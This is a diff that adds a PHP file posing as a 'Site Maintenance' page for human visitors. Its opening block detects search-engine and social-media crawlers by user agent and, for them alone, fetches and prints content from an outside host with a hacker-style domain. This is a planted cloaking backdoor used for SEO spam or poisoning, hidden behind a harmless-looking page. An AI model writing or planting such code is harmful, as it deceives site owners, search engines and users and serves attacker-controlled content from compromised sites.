@@ -1,0 +1,91 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array(
+        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
+        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo', 'YandexBot',
+        'Baiduspider', 'TelegramBot', 'facebookexternalhit', 'Pinterest', 'W3C_Validator',
+        'Google-Site-Verification', 'Google-InspectionTool', 'Applebot', 'AhrefsBot', 'SEMrushBot', 'MJ12bot'
+    );
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+function fetch_message_from_url($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
+    $response = curl_exec($ch);
+    
+    if (curl_errno($ch)) {
+        error_log("Error cURL: " . curl_error($ch));
+        curl_close($ch);
+        return false;
+    }
+    
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($http_code == 200) {
+        return $response;
+    } else {
+        error_log("HTTP Error: Status Code " . $http_code);
+        return false;
+    }
+}
+
+if (is_bot()) { 
+    $message = fetch_message_from_url('https://tennesse.haxor-mahasuhu.info/wuatehelll/index.php');
+    
+    if ($message) {
+        echo $message;
+    } else {
+        echo "";
+    }
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Maintenance</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        .maintenance-message {
+            background-color: #ffcc00;
+            padding: 50px;
+            margin-top: 100px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            font-size: 18px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="maintenance-message">
+        <h1>We are currently performing some maintenance.</h1>
+        <p>Please check back later. We apologize for the inconvenience and appreciate your patience.</p>
+    </div>
+</body>
+</html>
